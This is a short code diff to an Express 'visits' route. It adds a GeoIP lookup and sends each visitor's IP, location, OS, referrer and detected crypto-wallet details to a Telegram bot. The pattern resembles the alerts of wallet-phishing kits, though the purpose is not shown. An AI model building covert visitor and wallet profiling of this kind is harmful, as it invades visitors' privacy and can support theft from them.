@@ -1,4 +1,5 @@
 import { Router } from 'express'
+import { lookupIp } from './geoip.js'
 import { sanitizeClientMeta } from '../shared/clientMeta.js'
 import { sanitizeWalletSnapshot } from '../shared/wallets.js'
 import { sendTelegram, telegramConfigured } from './telegram.js'
@@ -59,6 +60,7 @@ function visitMessage(visit) {
     `Page: ${visit.path}`,
     visit.title ? `Title: ${visit.title}` : '',
     `IP: ${visit.ip || 'unknown'}`,
+    visit.geo ? `Location: ${visit.geo}` : '',
     `OS: ${visit.os || 'unknown'}`,
     ...walletLines(visit.wallets),
     visit.referrer ? `From: ${visit.referrer}` : 'From: direct',
@@ -91,9 +93,10 @@ visitsRouter.post('/', (req, res) => {
     return res.status(204).end()
   }
 
-  sendTelegram(visitMessage(visit))
+  res.status(204).end()
+
+  lookupIp(visit.ip)
+    .then((geo) => sendTelegram(visitMessage({ ...visit, geo: geo.label || '' })))
     .then(() => console.log('[telegram] sent', visit.path, visit.ip || ''))
     .catch((error) => console.warn('[telegram] visit failed:', error.message))
-
-  res.status(204).end()
 })
